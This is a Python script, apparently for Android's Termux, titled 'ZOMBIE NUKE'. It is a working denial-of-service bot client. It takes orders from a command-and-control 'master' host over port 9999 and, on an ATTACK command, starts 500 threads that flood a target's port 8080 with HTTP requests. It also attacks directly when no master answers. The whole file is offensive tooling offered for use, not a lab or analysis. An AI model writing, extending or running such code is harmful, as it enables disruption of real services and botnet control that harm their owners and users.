#!/data/data/com.termux/files/usr/bin/python3
"""
💀 ZOMBIE NUKE - CERO SLEEPS, PURA VIOLENCIA
"""
import socket, threading, time, sys

TARGET_IP = "192.168.1.100" if len(sys.argv) < 2 else sys.argv[1]
TARGET_PORT = 8080
MASTER_IP = "192.168.1.10"
running = True
req_count = 0

def nuclear_worker():
    """Worker nuclear sin sleeps"""
    global req_count
    request = b"GET / HTTP/1.1\r\n\r\n"
    target = (TARGET_IP, TARGET_PORT)
    
    while running:
        try:
            # Socket NON-BLOCKING para máxima velocidad
            s = socket.socket()
            s.settimeout(0.000001)  # 1 microsegundo
            s.connect(target)
            s.send(request)
            s.close()
            req_count += 1
        except:
            try:
                s.close()
            except:
                pass
            # NO SLEEP - reintentar inmediatamente

def connect_master():
    """Conexión ultra rápida al master"""
    global running
    try:
        s = socket.socket()
        s.settimeout(0)
        s.connect((MASTER_IP, 9999))
        print(f"[+] Conectado a {MASTER_IP}")
        
        while running:
            try:
                data = s.recv(1024)
                if b"ATTACK" in data:
                    print("[🔥] ATAQUE ACTIVADO")
                    # Iniciar 500 workers inmediatamente
                    for _ in range(500):
                        threading.Thread(target=nuclear_worker, daemon=True).start()
                elif b"STOP" in data:
                    running = False
                s.send(b"PING\n")
            except:
                break
    except:
        # Si no hay master, atacar igual
        print("[⚠️] Sin master, atacando directo")
        for _ in range(500):
            threading.Thread(target=nuclear_worker, daemon=True).start()

if __name__ == "__main__":
    print(f"[💀] ZOMBIE NUKE INICIADO")
    print(f"[🎯] Target: {TARGET_IP}:{TARGET_PORT}")
    
    # Conectar al master en segundo plano
    threading.Thread(target=connect_master, daemon=True).start()
    
    # Mostrar estadísticas
    try:
        start = time.time()
        while running:
            time.sleep(1)  # Solo para stats
            elapsed = time.time() - start
            rps = req_count / elapsed if elapsed > 0 else 0
            print(f"[📊] {int(elapsed)}s | {req_count:,} reqs | {rps:,.0f} RPS")
    except KeyboardInterrupt:
        running = False
        print(f"\n[✅] TOTAL: {req_count:,} requests")
